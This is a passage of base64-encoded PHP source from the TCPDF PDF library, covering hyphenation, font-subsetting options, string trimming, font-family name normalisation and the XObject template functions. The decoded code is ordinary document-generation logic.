XkoJHBhdHRlcm5zKSkgewoJCQkkcGF0dGVybnMgPSBUQ1BERl9TVEFUSUM6OmdldEh5cGhlblBhdHRlcm5zRnJvbVRFWCgkcGF0dGVybnMpOwoJCX0KCQkvLyBnZXQgYXJyYXkgb2YgY2hhcmFjdGVycwoJCSR1bmljaGFycyA9IFRDUERGX0ZPTlRTOjpVVEY4U3RyaW5nVG9BcnJheSgkdGV4dCwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkvLyBmb3IgZWFjaCBjaGFyCgkJZm9yZWFjaCAoJHVuaWNoYXJzIGFzICRjaGFyKSB7CgkJCWlmICgoISRpbnRhZykgQU5EICghJHNraXApIEFORCBUQ1BERl9GT05UX0RBVEE6OiR1bmlfdHlwZVskY2hhcl0gPT0gJ0wnKSB7CgkJCQkvLyBsZXR0ZXIgY2hhcmFjdGVyCgkJCQkkd29yZFtdID0gJGNoYXI7CgkJCX0gZWxzZSB7CgkJCQkvLyBvdGhlciB0eXBlIG9mIGNoYXJhY3RlcgoJCQkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkd29yZCkpIHsKCQkJCQkvLyBoeXBlbmF0ZSB0aGUgd29yZAoJCQkJCSR0eHRhcnIgPSBhcnJheV9tZXJnZSgkdHh0YXJyLCAkdGhpcy0+aHlwaGVuYXRlV29yZCgkd29yZCwgJHBhdHRlcm5zLCAkZGljdGlvbmFyeSwgJGxlZnRtaW4sICRyaWdodG1pbiwgJGNoYXJtaW4sICRjaGFybWF4KSk7CgkJCQkJJHdvcmQgPSBhcnJheSgpOwoJCQkJfQoJCQkJJHR4dGFycltdID0gJGNoYXI7CgkJCQlpZiAoY2hyKCRjaGFyKSA9PSAnPCcpIHsKCQkJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIEhUTUwgdGFnCgkJCQkJJGludGFnID0gdHJ1ZTsKCQkJCX0gZWxzZWlmICgkaW50YWcgQU5EIChjaHIoJGNoYXIpID09ICc+JykpIHsKCQkJCQkvLyBlbmQgb2YgSFRNTCB0YWcKCQkJCQkkaW50YWcgPSBmYWxzZTsKCQkJCQkvLyBjaGVjayBmb3Igc3R5bGUgdGFnCgkJCQkJJGV4cGVjdGVkID0gYXJyYXkoMTE1LCAxMTYsIDEyMSwgMTA4LCAxMDEpOyAvLyA9ICdzdHlsZScKCQkJCQkkY3VycmVudCA9IGFycmF5X3NsaWNlKCR0eHRhcnIsIC02LCA1KTsgLy8gbGFzdCA1IGNoYXJzCgkJCQkJJGNvbXBhcmUgPSBhcnJheV9kaWZmKCRleHBlY3RlZCwgJGN1cnJlbnQpOwoJCQkJCWlmIChlbXB0eSgkY29tcGFyZSkpIHsKCQkJCQkJLy8gY2hlY2sgaWYgaXQgaXMgYSBjbG9zaW5nIHRhZwoJCQkJCQkkZXhwZWN0ZWQgPSBhcnJheSg0Nyk7IC8vID0gJy8nCgkJCQkJCSRjdXJyZW50ID0gYXJyYXlfc2xpY2UoJHR4dGFyciwgLTcsIDEpOwoJCQkJCQkkY29tcGFyZSA9IGFycmF5X2RpZmYoJGV4cGVjdGVkLCAkY3VycmVudCk7CgkJCQkJCWlmIChlbXB0eSgkY29tcGFyZSkpIHsKCQkJCQkJCS8vIGNsb3Npbmcgc3R5bGUgdGFnCgkJCQkJCQkkc2tpcCA9IGZhbHNlOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJLy8gb3BlbmluZyBzdHlsZSB0YWcKCQkJCQkJCSRza2lwID0gdHJ1ZTsKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR3b3JkKSkgewoJCQkvLyBoeXBlbmF0ZSB0aGUgd29yZAoJCQkkdHh0YXJyID0gYXJyYXlfbWVyZ2UoJHR4dGFyciwgJHRoaXMtPmh5cGhlbmF0ZVdvcmQoJHdvcmQsICRwYXR0ZXJucywgJGRpY3Rpb25hcnksICRsZWZ0bWluLCAkcmlnaHRtaW4sICRjaGFybWluLCAkY2hhcm1heCkpOwoJCX0KCQkvLyBjb252ZXJ0IGNoYXIgYXJyYXkgdG8gc3RyaW5nIGFuZCByZXR1cm4KCQlyZXR1cm4gVENQREZfRk9OVFM6OlVURjhBcnJTdWJTdHJpbmcoJHR4dGFyciwgJycsICcnLCAkdGhpcy0+aXN1bmljb2RlKTsKCX0KCgkvKioKCSAqIEVuYWJsZS9kaXNhYmxlIHJhc3Rlcml6YXRpb24gb2YgdmVjdG9yIGltYWdlcyB1c2luZyBJbWFnZU1hZ2ljayBsaWJyYXJ5LgoJICogQHBhcmFtIGJvb2xlYW4gJG1vZGUgaWYgdHJ1ZSBlbmFibGUgcmFzdGVyaXphdGlvbiwgZmFsc2Ugb3RoZXJ3aXNlLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuMC4wMDAgKDIwMTAtMDQtMjcpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRSYXN0ZXJpemVWZWN0b3JJbWFnZXMoJG1vZGUpIHsKCQkkdGhpcy0+cmFzdGVyaXplX3ZlY3Rvcl9pbWFnZXMgPSAkbW9kZTsKCX0KCgkvKioKCSAqIEVuYWJsZSBvciBkaXNhYmxlIGRlZmF1bHQgb3B0aW9uIGZvciBmb250IHN1YnNldHRpbmcuCgkgKiBAcGFyYW0gYm9vbGVhbiAkZW5hYmxlIGlmIHRydWUgZW5hYmxlIGZvbnQgc3Vic2V0dGluZyBieSBkZWZhdWx0LgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjMuMDAyICgyMDEwLTA2LTA3KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0Rm9udFN1YnNldHRpbmcoJGVuYWJsZT10cnVlKSB7CgkJaWYgKCR0aGlzLT5wZGZhX21vZGUpIHsKCQkJJHRoaXMtPmZvbnRfc3Vic2V0dGluZyA9IGZhbHNlOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5mb250X3N1YnNldHRpbmcgPSAkZW5hYmxlID8gdHJ1ZSA6IGZhbHNlOwoJCX0KCX0KCgkvKioKCSAqIFJldHVybiB0aGUgZGVmYXVsdCBvcHRpb24gZm9yIGZvbnQgc3Vic2V0dGluZy4KCSAqIEByZXR1cm4gYm9vbCBkZWZhdWx0IGZvbnQgc3Vic2V0dGluZyBzdGF0ZS4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS4zLjAwMiAoMjAxMC0wNi0wNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEZvbnRTdWJzZXR0aW5nKCkgewoJCXJldHVybiAkdGhpcy0+Zm9udF9zdWJzZXR0aW5nOwoJfQoKCS8qKgoJICogTGVmdCB0cmltIHRoZSBpbnB1dCBzdHJpbmcKCSAqIEBwYXJhbSBzdHJpbmcgJHN0ciBzdHJpbmcgdG8gdHJpbQoJICogQHBhcmFtIHN0cmluZyAkcmVwbGFjZSBzdHJpbmcgdGhhdCByZXBsYWNlIHNwYWNlcy4KCSAqIEByZXR1cm4gc3RyaW5nIGxlZnQgdHJpbW1lZCBzdHJpbmcKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS44LjAwMCAoMjAxMC0wOC0xMSkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHN0cmluZ0xlZnRUcmltKCRzdHIsICRyZXBsYWNlPScnKSB7CgkJcmV0dXJuIHByZWdfcmVwbGFjZSgnL14nLiR0aGlzLT5yZV9zcGFjZVsncCddLicrLycuJHRoaXMtPnJlX3NwYWNlWydtJ10sICRyZXBsYWNlLCAkc3RyKTsKCX0KCgkvKioKCSAqIFJpZ2h0IHRyaW0gdGhlIGlucHV0IHN0cmluZwoJICogQHBhcmFtIHN0cmluZyAkc3RyIHN0cmluZyB0byB0cmltCgkgKiBAcGFyYW0gc3RyaW5nICRyZXBsYWNlIHN0cmluZyB0aGF0IHJlcGxhY2Ugc3BhY2VzLgoJICogQHJldHVybiBzdHJpbmcgcmlnaHQgdHJpbW1lZCBzdHJpbmcKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS44LjAwMCAoMjAxMC0wOC0xMSkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHN0cmluZ1JpZ2h0VHJpbSgkc3RyLCAkcmVwbGFjZT0nJykgewoJCXJldHVybiBwcmVnX3JlcGxhY2UoJy8nLiR0aGlzLT5yZV9zcGFjZVsncCddLicrJC8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCAkcmVwbGFjZSwgJHN0cik7Cgl9CgoJLyoqCgkgKiBUcmltIHRoZSBpbnB1dCBzdHJpbmcKCSAqIEBwYXJhbSBzdHJpbmcgJHN0ciBzdHJpbmcgdG8gdHJpbQoJICogQHBhcmFtIHN0cmluZyAkcmVwbGFjZSBzdHJpbmcgdGhhdCByZXBsYWNlIHNwYWNlcy4KCSAqIEByZXR1cm4gc3RyaW5nIHRyaW1tZWQgc3RyaW5nCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOC4wMDAgKDIwMTAtMDgtMTEpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzdHJpbmdUcmltKCRzdHIsICRyZXBsYWNlPScnKSB7CgkJJHN0ciA9ICR0aGlzLT5zdHJpbmdMZWZ0VHJpbSgkc3RyLCAkcmVwbGFjZSk7CgkJJHN0ciA9ICR0aGlzLT5zdHJpbmdSaWdodFRyaW0oJHN0ciwgJHJlcGxhY2UpOwoJCXJldHVybiAkc3RyOwoJfQoKCS8qKgoJICogUmV0dXJuIHRydWUgaWYgdGhlIGN1cnJlbnQgZm9udCBpcyB1bmljb2RlIHR5cGUuCgkgKiBAcmV0dXJuIGJvb2wgdHJ1ZSBmb3IgdW5pY29kZSBmb250LCBmYWxzZSBvdGhlcndpc2UuCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOC4wMDIgKDIwMTAtMDgtMTQpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBpc1VuaWNvZGVGb250KCkgewoJCXJldHVybiAoKCR0aGlzLT5DdXJyZW50Rm9udFsndHlwZSddID09ICdUcnVlVHlwZVVuaWNvZGUnKSBPUiAoJHRoaXMtPkN1cnJlbnRGb250Wyd0eXBlJ10gPT0gJ2NpZGZvbnQwJykpOwoJfQoKCS8qKgoJICogUmV0dXJuIG5vcm1hbGl6ZWQgZm9udCBuYW1lCgkgKiBAcGFyYW0gc3RyaW5nICRmb250ZmFtaWx5IHByb3BlcnR5IHN0cmluZyBjb250YWluaW5nIGZvbnQgZmFtaWx5IG5hbWVzCgkgKiBAcmV0dXJuIHN0cmluZyBub3JtYWxpemVkIGZvbnQgbmFtZQoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjguMDA0ICgyMDEwLTA4LTE3KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Rm9udEZhbWlseU5hbWUoJGZvbnRmYW1pbHkpIHsKCQkvLyByZW1vdmUgc3BhY2VzIGFuZCBzeW1ib2xzCgkJJGZvbnRmYW1pbHkgPSBwcmVnX3JlcGxhY2UoJy9bXmEtejAtOV9cLF0vJywgJycsIHN0cnRvbG93ZXIoJGZvbnRmYW1pbHkpKTsKCQkvLyBleHRyYWN0IGFsbCBmb250IG5hbWVzCgkJJGZvbnRzbGlzdCA9IHByZWdfc3BsaXQoJy9bLF0vJywgJGZvbnRmYW1pbHkpOwoJCS8vIGZpbmQgZmlyc3QgdmFsaWQgZm9udCBuYW1lCgkJZm9yZWFjaCAoJGZvbnRzbGlzdCBhcyAkZm9udCkgewoJCQkvLyByZXBsYWNlIGZvbnQgdmFyaWF0aW9ucwoJCQkkZm9udCA9IHByZWdfcmVwbGFjZSgnL3JlZ3VsYXIkLycsICcnLCAkZm9udCk7CgkJCSRmb250ID0gcHJlZ19yZXBsYWNlKCcvaXRhbGljJC8nLCAnSScsICRmb250KTsKCQkJJGZvbnQgPSBwcmVnX3JlcGxhY2UoJy9vYmxpcXVlJC8nLCAnSScsICRmb250KTsKCQkJJGZvbnQgPSBwcmVnX3JlcGxhY2UoJy9ib2xkKFtJXT8pJC8nLCAnQlxcMScsICRmb250KTsKCQkJLy8gcmVwbGFjZSBjb21tb24gZmFtaWx5IG5hbWVzIGFuZCBjb3JlIGZvbnRzCgkJCSRwYXR0ZXJuID0gYXJyYXkoKTsKCQkJJHJlcGxhY2VtZW50ID0gYXJyYXkoKTsKCQkJJHBhdHRlcm5bXSA9ICcvXnNlcmlmfF5jdXJzaXZlfF5mYW50YXN5fF50aW1lc25ld3JvbWFuLyc7CgkJCSRyZXBsYWNlbWVudFtdID0gJ3RpbWVzJzsKCQkJJHBhdHRlcm5bXSA9ICcvXnNhbnNzZXJpZi8nOwoJCQkkcmVwbGFjZW1lbnRbXSA9ICdoZWx2ZXRpY2EnOwoJCQkkcGF0dGVybltdID0gJy9ebW9ub3NwYWNlLyc7CgkJCSRyZXBsYWNlbWVudFtdID0gJ2NvdXJpZXInOwoJCQkkZm9udCA9IHByZWdfcmVwbGFjZSgkcGF0dGVybiwgJHJlcGxhY2VtZW50LCAkZm9udCk7CgkJCWlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmb250KSwgJHRoaXMtPmZvbnRsaXN0KSBPUiBpbl9hcnJheSgkZm9udCwgJHRoaXMtPmZvbnRrZXlzKSkgewoJCQkJcmV0dXJuICRmb250OwoJCQl9CgkJfQoJCS8vIHJldHVybiBjdXJyZW50IGZvbnQgYXMgZGVmYXVsdAoJCXJldHVybiAkdGhpcy0+Q3VycmVudEZvbnRbJ2ZvbnRrZXknXTsKCX0KCgkvKioKCSAqIFN0YXJ0IGEgbmV3IFhPYmplY3QgVGVtcGxhdGUuCgkgKiBBbiBYT2JqZWN0IFRlbXBsYXRlIGlzIGEgUERGIGJsb2NrIHRoYXQgaXMgYSBzZWxmLWNvbnRhaW5lZCBkZXNjcmlwdGlvbiBvZiBhbnkgc2VxdWVuY2Ugb2YgZ3JhcGhpY3Mgb2JqZWN0cyAoaW5jbHVkaW5nIHBhdGggb2JqZWN0cywgdGV4dCBvYmplY3RzLCBhbmQgc2FtcGxlZCBpbWFnZXMpLgoJICogQW4gWE9iamVjdCBUZW1wbGF0ZSBtYXkgYmUgcGFpbnRlZCBtdWx0aXBsZSB0aW1lcywgZWl0aGVyIG9uIHNldmVyYWwgcGFnZXMgb3IgYXQgc2V2ZXJhbCBsb2NhdGlvbnMgb24gdGhlIHNhbWUgcGFnZSBhbmQgcHJvZHVjZXMgdGhlIHNhbWUgcmVzdWx0cyBlYWNoIHRpbWUsIHN1YmplY3Qgb25seSB0byB0aGUgZ3JhcGhpY3Mgc3RhdGUgYXQgdGhlIHRpbWUgaXQgaXMgaW52b2tlZC4KCSAqIE5vdGU6IFgsWSBjb29yZGluYXRlcyB3aWxsIGJlIHJlc2V0IHRvIDAsMC4KCSAqIEBwYXJhbSBpbnQgJHcgVGVtcGxhdGUgd2lkdGggaW4gdXNlciB1bml0cyAoZW1wdHkgc3RyaW5nIG9yIHplcm8gPSBwYWdlIHdpZHRoIGxlc3MgbWFyZ2lucykuCgkgKiBAcGFyYW0gaW50ICRoIFRlbXBsYXRlIGhlaWdodCBpbiB1c2VyIHVuaXRzIChlbXB0eSBzdHJpbmcgb3IgemVybyA9IHBhZ2UgaGVpZ2h0IGxlc3MgbWFyZ2lucykuCgkgKiBAcGFyYW0gbWl4ZWQgJGdyb3VwIFNldCB0cmFuc3BhcmVuY3kgZ3JvdXAuIENhbiBiZSBhIGJvb2xlYW4gdmFsdWUgb3IgYW4gYXJyYXkgc3BlY2lmeWluZyBvcHRpb25hbCBwYXJhbWV0ZXJzOiAnQ1MnIChzb2xvdXIgc3BhY2UgbmFtZSksICdJJyAoYm9vbGVhbiBmbGFnIHRvIGluZGljYXRlIGlzb2xhdGVkIGdyb3VwKSBhbmQgJ0snIChib29sZWFuIGZsYWcgdG8gaW5kaWNhdGUga25vY2tvdXQgZ3JvdXApLgoJICogQHJldHVybiBzdHJpbmd8ZmFsc2UgdGhlIFhPYmplY3QgVGVtcGxhdGUgSUQgaW4gY2FzZSBvZiBzdWNjZXNzIG9yIGZhbHNlIGluIGNhc2Ugb2YgZXJyb3IuCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOC4wMTcgKDIwMTAtMDgtMjQpCgkgKiBAc2VlIGVuZFRlbXBsYXRlKCksIHByaW50VGVtcGxhdGUoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc3RhcnRUZW1wbGF0ZSgkdz0wLCAkaD0wLCAkZ3JvdXA9ZmFsc2UpIHsKCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkvLyB3ZSBhcmUgYWxyZWFkeSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJCSR0aGlzLT5pbnhvYmogPSB0cnVlOwoJCSsrJHRoaXMtPm47CgkJLy8gWE9iamVjdCBJRAoJCSR0aGlzLT54b2JqaWQgPSAnWFQnLiR0aGlzLT5uOwoJCS8vIG9iamVjdCBJRAoJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXSA9IGFycmF5KCduJyA9PiAkdGhpcy0+bik7CgkJLy8gc3RvcmUgY3VycmVudCBncmFwaGljIHN0YXRlCgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydndmFycyddID0gJHRoaXMtPmdldEdyYXBoaWNWYXJzKCk7CgkJLy8gaW5pdGlhbGl6ZSBkYXRhCgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydpbnRtcmsnXSA9IDA7CgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWyd0cmFuc2ZtcmsnXSA9IGFycmF5KCk7CgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ10gPSAnJzsKCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ3hvYmplY3RzJ10gPSBhcnJheSgpOwoJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnaW1hZ2VzJ10gPSBhcnJheSgpOwoJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnZm9udHMnXSA9IGFycmF5KCk7CgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydhbm5vdGF0aW9ucyddID0gYXJyYXkoKTsKCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2V4dGdzdGF0ZXMnXSA9IGFycmF5KCk7CgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydncmFkaWVudHMnXSA9IGFycmF5KCk7CgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydzcG90X2NvbG9ycyddID0gYXJyYXkoKTsKCQkvLyBzZXQgbmV3IGVudmlyb25tZW50CgkJJHRoaXMtPm51bV9jb2x1bW5zID0gMTsKCQkkdGhpcy0+Y3VycmVudF9jb2x1bW4gPSAwOwoJCSR0aGlzLT5zZXRBdXRvUGFnZUJyZWFrKGZhbHNlKTsKCQlpZiAoKCR3ID09PSAnJykgT1IgKCR3IDw9IDApKSB7CgkJCSR3ID0gJHRoaXMtPncgLSAkdGhpcy0+bE1hcmdpbiAtICR0aGlzLT5yTWFyZ2luOwoJCX0KCQlpZiAoKCRoID09PSAnJykgT1IgKCRoIDw9IDApKSB7CgkJCSRoID0gJHRoaXMtPmggLSAkdGhpcy0+dE1hcmdpbiAtICR0aGlzLT5iTWFyZ2luOwoJCX0KCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ3gnXSA9IDA7CgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWyd5J10gPSAwOwoJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndyddID0gJHc7CgkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydoJ10gPSAkaDsKCQkkdGhpcy0+dyA9ICR3OwoJCSR0aGlzLT5oID0gJGg7CgkJJHRoaXMtPndQdCA9ICR0aGlzLT53ICogJHRoaXMtPms7CgkJJHRoaXMtPmhQdCA9ICR0aGlzLT5oICogJHRoaXMtPms7CgkJJHRoaXMtPmZ3UHQgPSAkdGhpcy0+d1B0OwoJCSR0aGlzLT5maFB0ID0gJHRoaXMtPmhQdDsKCQkkdGhpcy0+eCA9IDA7CgkJJHRoaXMtPnkgPSAwOwoJCSR0aGlzLT5sTWFyZ2luID0gMDsKCQkkdGhpcy0+ck1hcmdpbiA9IDA7CgkJJHRoaXMtPnRNYXJnaW4gPSAwOwoJCSR0aGlzLT5iTWFyZ2luID0gMDsKCQkvLyBzZXQgZ3JvdXAgbW9kZQoJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnZ3JvdXAnXSA9ICRncm91cDsKCQlyZXR1cm4gJHRoaXMtPnhvYmppZDsKCX0KCgkvKioKCSAqIEVuZCB0aGUgY3VycmVudCBYT2JqZWN0IFRlbXBsYXRlIHN0YXJ0ZWQgd2l0aCBzdGFydFRlbXBsYXRlKCkgYW5kIHJlc3RvcmUgdGhlIHByZXZpb3VzIGdyYXBoaWMgc3RhdGUuCgkgKiBBbiBYT2JqZWN0IFRlbXBsYXRlIGlzIGEgUERGIGJsb2NrIHRoYXQgaXMgYSBzZWxmLWNvbnRhaW5lZCBkZXNjcmlwdGlvbiBvZiBhbnkgc2VxdWVuY2Ugb2YgZ3JhcGhpY3Mgb2JqZWN0cyAoaW5jbHVkaW5nIHBhdGggb2JqZWN0cywgdGV4dCBvYmplY3RzLCBhbmQgc2FtcGxlZCBpbWFnZXMpLgoJICogQW4gWE9iamVjdCBUZW1wbGF0ZSBtYXkgYmUgcGFpbnRlZCBtdWx0aXBsZSB0aW1lcywgZWl0aGVyIG9uIHNldmVyYWwgcGFnZXMgb3IgYXQgc2V2ZXJhbCBsb2NhdGlvbnMgb24gdGhlIHNhbWUgcGFnZSBhbmQgcHJvZHVjZXMgdGhlIHNhbWUgcmVzdWx0cyBlYWNoIHRpbWUsIHN1YmplY3Qgb25seSB0byB0aGUgZ3JhcGhpY3Mgc3RhdGUgYXQgdGhlIHRpbWUgaXQgaXMgaW52b2tlZC4KCSAqIEByZXR1cm4gc3RyaW5nfGZhbHNlIHRoZSBYT2JqZWN0IFRlbXBsYXRlIElEIGluIGNhc2Ugb2Ygc3VjY2VzcyBvciBmYWxzZSBpbiBjYXNlIG9mIGVycm9yLgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjguMDE3ICgyMDEwLTA4LTI0KQoJICogQHNlZSBzdGFydFRlbXBsYXRlKCksIHByaW50VGVtcGxhdGUoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gZW5kVGVtcGxhdGUoKSB7CgkJaWYgKCEkdGhpcy0+aW54b2JqKSB7CgkJCS8vIHdlIGFyZSBub3QgaW5zaWRlIGEgdGVtcGxhdGUKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQkkdGhpcy0+aW54b2JqID0gZmFsc2U7CgkJLy8gcmVzdG9yZSBwcmV2aW91cyBncmFwaGljIHN0YXRlCgkJJHRoaXMtPnNldEdyYXBoaWNWYXJzKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnZ3ZhcnMnXSwgdHJ1ZSk7CgkJcmV0dXJuICR0aGlzLT54b2JqaWQ7Cgl9CgoJLyoqCgkgKiBQcmludCBhbiBYT2JqZWN0IFRlbXBsYXRlLgoJICogWW91IGNhbiBwcmludCBhbiBYT2JqZWN0IFRlbXBsYXRlIGluc2lkZSB0aGUgY3VycmVudGx5IG9wZW5lZCBUZW1wbGF0ZS4KCSAqIEFuIFhPYmplY3QgVGVtcGxhdGUgaXMgYSBQREYgYmxvY2sgdGhhdCBpcyBhIHNlbGYtY29udGFpbmVkIGRlc2NyaXB0aW9uIG9mIGFueSBzZXF1ZW5jZSBvZiBncmFwaGljcyBvYmplY3RzIChpbmNsdWRpbmcgcGF0aCBvYmplY3RzLCB0ZXh0IG9iamVjdHMsIGFuZCBzYW1wbGVkIGltYWdlcykuCgkgKiBBbiBYT2JqZWN0IFRlbXBsYXRlIG1heSBiZSBwYWludGVkIG11bHRpcGxlIHRpbWVzLCBlaXRoZXIgb24gc2V2ZXJhbCBwYWdlcyBvciBhdCBzZXZlcmFsIGxvY2F0aW9ucyBvbiB0aGUgc2FtZSBwYWdlIGFuZCBwcm9kdWNlcyB0aGUgc2FtZSByZXN1bHRzIGVhY2ggdGltZSwgc3ViamVjdCBvbmx5IHRvIHRoZSBncmFwaGljcyBzdGF0ZSBhdCB0aGUgdGltZSBpdCBpcyBpbnZva2VkLgoJICogQHBhcmFtIHN0cmluZyAkaWQgVGhlIElEIG9mIFhPYmplY3QgVGVtcGxhdGUgdG8gcHJpbnQuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCBYIHBvc2l0aW9uIGluIHVzZXIgdW5pdHMgKGVtcHR5IHN0cmluZyA9IGN1cnJlbnQgeCBwb3NpdGlvbikKCSAqIEBwYXJhbSBmbG9hdHxudWxsICR5IFkgcG9zaXRpb24gaW4gdXNlciB1bml0cyAoZW1wdHkgc3RyaW5nID0gY3VycmVudCB5IHBvc2l0aW9uKQoJICogQHBhcmFtIGZsb2F0ICR3IFdpZHRoIGluIHVzZXIgdW5pdHMgKHplcm8gPSByZW1haW5pbmcgcGFnZSB3aWR0aCkKCSAqIEBwYXJhbSBmbG9hdCAkaCBIZWlnaHQgaW4gdXNlciB1bml0cyAoemVybyA9IHJlbWFpbmluZyBwYWdlIGhlaWdodCkKCSAqIEBwYXJhbSBzdHJpbmcgJGFsaWduIEluZGljYXRlcyB0aGUgYWxpZ25tZW50IG9mIHRoZSBwb2ludGVyIG5leHQgdG8gdGVtcGxhdGUgaW5zZXJ0aW9uIHJlbGF0aXZlIHRvIHRlbXBsYXRlIGhlaWdodC4gVGhlIHZhbHVlIGNhbiBiZTo8dWw+PGxpPlQ6IHRvcC1yaWdodCBmb3IgTFRSIG9yIHRvcC1sZWZ0IGZvciBSVEw8L2xpPjxsaT5NOiBtaWRkbGUtcmlnaHQgZm9yIExUUiBvciBtaWRkbGUtbGVmdCBmb3IgUlRMPC9saT48bGk+QjogYm90dG9tLXJpZ2h0IGZvciBMVFIgb3IgYm90dG9tLWxlZnQgZm9yIFJUTDwvbGk+PGxpPk46IG5leHQgbGluZTwvbGk+PC91bD4KCSAqIEBwYXJhbSBzdHJpbmcgJHBhbGlnbiBBbGxvd3MgdG8gY2VudGVyIG9yIGFsaWduIHRoZSB0ZW1wbGF0ZSBvbiB0aGUgY3VycmVudCBsaW5lLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+TCA6IGxlZnQgYWxpZ248L2xpPjxsaT5DIDogY2VudGVyPC9saT48bGk+UiA6IHJpZ2h0IGFsaWduPC9saT48bGk+JycgOiBlbXB0eSBzdHJpbmcgOiBsZWZ0IGZvciBMVFIgb3IgcmlnaHQgZm9yIFJUTDwvbGk+PC91bD4KCSAqIEBwYXJhbSBib29sZWFuICRmaXRvbnBhZ2UgSWYgdHJ1ZSB0aGUgdGVtcGxhdGUgaXMgcmVzaXplZCB0byBub3QgZXhjZWVkIHBhZ2UgZGltZW5zaW9ucy4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS44LjAxNyAoMjAxMC0wOC0yNCkKCSAqIEBzZWUgc3RhcnRUZW1wbGF0ZSgpLCBlbmRUZW1wbGF0ZSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBwcmludFRlbXBsYXRlKCRpZCwgJHg9bnVsbCwgJHk9bnVsbCwgJHc9MCwgJGg9MCwgJGFsaWduPScnLCAkcGFsaWduPScnLCAkZml0b25wYWdlPWZhbHNlKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSAhPSAyKSB7CgkJCSByZXR1cm47CgkJfQoJCWlmICghaXNzZXQoJHRoaXMtPnhvYmplY3RzWyRpZF0pKSB7CgkJCSR0aGlzLT5FcnJvcignVGhlIFhPYmplY3QgVGVtcGxhdGUgXCcnLiRpZC4nXCcgZG9lc25cJ3QgZXhpc3QhJyk7CgkJfQoJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCWlmICgkaWQgPT0gJHRoaXMtPnhvYmppZCkgewoJCQkJLy8gY2xvc2UgY3VycmVudCB0ZW1wbGF0ZQoJCQkJJHRoaXMtPmVuZFRlbXBsYXRlKCk7CgkJCX0gZWxzZSB7CgkJCQkvLyB1c2UgdGhlIHRlbXBsYXRlIGFzIHJlc291cmNlIGZvciB0aGUgdGVtcGxhdGUgY3VycmVudGx5IG9wZW5lZAoJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWyd4b2JqZWN0cyddWyRpZF0gPSAkdGhpcy0+eG9iamVjdHNbJGlkXTsKCQkJfQoJCX0KCQkvLyBzZ